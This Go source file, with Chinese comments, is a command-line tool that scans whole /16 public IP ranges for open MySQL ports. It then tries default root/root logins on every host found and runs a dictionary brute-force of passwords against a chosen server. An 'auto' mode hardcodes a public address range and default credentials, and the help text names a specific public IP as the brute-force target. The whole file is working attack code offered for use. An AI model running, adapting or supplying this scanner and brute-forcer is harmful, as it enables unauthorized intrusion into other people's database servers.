package main

import (
	"database/sql"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Main struct {
}

var queue Queue

/**
**获取ip
 */
func (this *Main) ListIp(start string) []string {
	list := make([]string, 0)
	for i := 1; i < 256; i++ {
		for j := 1; j < 256; j++ {
			ip := start + "." + strconv.Itoa(i) + "." + strconv.Itoa(j)
			list = append(list, ip)
		}
	}

	return list
}

/**
**连接对应的服务器，当连接成功后加入到队列中
**/
func (this *Main) Connect(ip string, wg *sync.WaitGroup, port int) {
	tcpAddr, err := net.ResolveTCPAddr("tcp4", ip+":"+strconv.Itoa(port))
	if err == nil {
		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err == nil {
			defer conn.Close()
			num, e2 := conn.Write([]byte("hello word"))
			if num > 0 && e2 == nil {
				fmt.Println("this ip: ", ip, " connect,port: ", port, ".")
				//加入到队列中
				queue.Add(ip)
			}
		}

	}
	wg.Done()
}

/**
**扫描对应段的ip
* start 如 "47.96"
* port 如 3306
 */
func ScanIp(start string, port int, fileName string) {
	var wg sync.WaitGroup
	fmt.Println("start scanner .....")
	mm := &Main{}
	list := mm.ListIp(start)
	for _, val := range list {
		wg.Add(1)
		go mm.Connect(val, &wg, port)
	}
	wg.Wait()
	//端口开放的ip
	openIp := ""
	//取出队列中的数据保存到文件已给其他函数使用
	for true {
		ip := queue.Pop()
		if ip == nil {
			break
		}
		ee := ip.(string)
		openIp += ee + "\r\n"
	}
	fmt.Println("ip save to ", fileName)
	ioutil.WriteFile(fileName, []byte(openIp), 666)
}

/**
*文件中对应的iP
 */
func Read(fileName string) []string {
	filebyt, err := ioutil.ReadFile(fileName)
	list := make([]string, 0)
	if err == nil {
		ips := strings.Split(string(filebyt), "\r\n")
		for _, value := range ips {
			if value != "" {
				list = append(list, value)
			}
		}

	}
	return list
}

/**
*超时返回错误函数
 */
func pingOut(db *sql.DB, timeout time.Duration) error {
	ch := make(chan error)
	go func() {
		ch <- db.Ping()
	}()
	select {
	case res := <-ch:
		return res
	case <-time.After(timeout):
		return errors.New("time out ！")
	}
}

/**
*连接mysql
**/
func ConnectMysql(iplist []string, user string, password string, port int) {
	fmt.Println("connect ......")
	//能够连接的ip
	connectIp := ""
	mayIp := ""
	for index, ip := range iplist {
		url := user + ":" + password + "@tcp(" + ip + ":" + strconv.Itoa(port) + ")/mysql"
		fmt.Println("----------------------:", index, url)

		db, err := sql.Open("mysql", url)
		if err == nil {
			//当一秒过后请求超时
			err2 := pingOut(db, time.Second*1)
			if err2 == nil {
				//这个是直接连接成功的
				fmt.Println(ip)
				connectIp += ip + "\r\n"
			} else {
				//这种存在多种情况
				fmt.Println("not ping:", err2)
				msg := err2.Error()
				//这种是可能会被破解的ip
				if strings.Index(msg, "using password: YES") > 0 {
					mayIp += ip + "\r\n"
				}
			}
		} else {
			//这种连接是没有用的直接丢弃
			fmt.Println("not open:", err)
		}
		//关闭连接
		db.Close()
		time.Sleep(time.Second * 1)
	}

	//将数据保存
	if len(mayIp) > 0 {
		ioutil.WriteFile("mayip.txt", []byte(mayIp), 666)
	}
	if len(connectIp) > 0 {
		ioutil.WriteFile("connectip.txt", []byte(connectIp), 666)
	}

}
func Bugger(ip string, user string, port int, fileName string) {
	passwordList := Read(fileName)
	for _, pass := range passwordList {
		url := user + ":" + pass + "@tcp(" + ip + ":" + strconv.Itoa(port) + ")/mysql"
		db, err := sql.Open("mysql", url)
		fmt.Println("test ", pass)
		if err == nil {
			err2 := pingOut(db, time.Second*1)
			if err2 == nil {
				fmt.Println()
				fmt.Println("成功:", url)
			} else {
				if strings.LastIndex(err2.Error(), "bad connection") > 0 {
					fmt.Println("~亲~ip被限制了")
					break
				} else {
					//fmt.Println(err2)
				}
			}
		} else {
			//fmt.Println(err)
		}
		db.Close()
		time.Sleep(time.Millisecond * 500)

	}
}
func cmd() {
	size := len(os.Args)
	if size > 1 {
		//当是扫描时
		if os.Args[1] == "scan" {
			if size < 5 {
				fmt.Println("请输入适当的参数")
				return
			}
			port, err := strconv.Atoi(os.Args[3])
			if err != nil {
				fmt.Println("端口输入错误")
				return
			}
			ScanIp(os.Args[2], port, os.Args[4])
		} else if os.Args[1] == "connect" {
			if size < 6 {
				fmt.Println("请输入适当的参数")
				return
			}
			port, err := strconv.Atoi(os.Args[4])
			if err != nil {
				fmt.Println("端口输入错误")
				return
			}
			ipList := Read(os.Args[5])
			ConnectMysql(ipList, os.Args[2], os.Args[3], port)
		} else if os.Args[1] == "auto" {
			ScanIp("58.49", 3306, "openip.txt")
			ipList := Read("openip.txt")
			ConnectMysql(ipList, "root", "root", 3306)
		} else if os.Args[1] == "auto2" {
			port, err := strconv.Atoi(os.Args[5])
			if err != nil {
				fmt.Println("端口输入错误")
				return
			}
			ScanIp(os.Args[2], port, "openip.txt")
			ipList := Read("openip.txt")
			ConnectMysql(ipList, os.Args[3], os.Args[4], port)
		} else if os.Args[1] == "bugger" {
			port, err := strconv.Atoi(os.Args[4])
			if err != nil {
				fmt.Println("端口输入错误")
				return
			}
			fmt.Println("开始暴力破解")
			Bugger(os.Args[2], os.Args[3], port, os.Args[5])
		}
	} else {
		fmt.Println("---------欢迎使用小工具----------")
		fmt.Println("             帮助              ")
		fmt.Println()
		fmt.Println("scan 58.49 3306 openip.txt")
		fmt.Println("  ---扫描IP地址段为58.49端口为3306成功后保存在openip.txt")
		fmt.Println()
		fmt.Println("connect root root 3306 openip.txt")
		fmt.Println("  ---扫描openip.txt的ip用户名root,密码root,端口3306")
		fmt.Println()
		fmt.Println("bugger 58.49.35.14 root 3306 password.txt")
		fmt.Println("  ---暴力破解ip为58.49.35.14,用户名为root,端口为3306，密码字典为password.txt")
		fmt.Println()
		fmt.Println("auto")
		fmt.Println("  ---默认用户名是root,密码是root,端口是3306,ip地址段是58.49")
	}
}

func main() {
	cmd()
	//1.扫描对应的ip地址段，获取开通3306端口的ip,并保存到文件
	//ScanIp("58.49", 3306, "openip.txt")
	//2.读取ip，然后根据给定的密码连接数据库
	//ipList := Read("openip.txt")
	//ConnectMysql(ipList, "root", "123456", 3306)
	fmt.Println("完成")
}
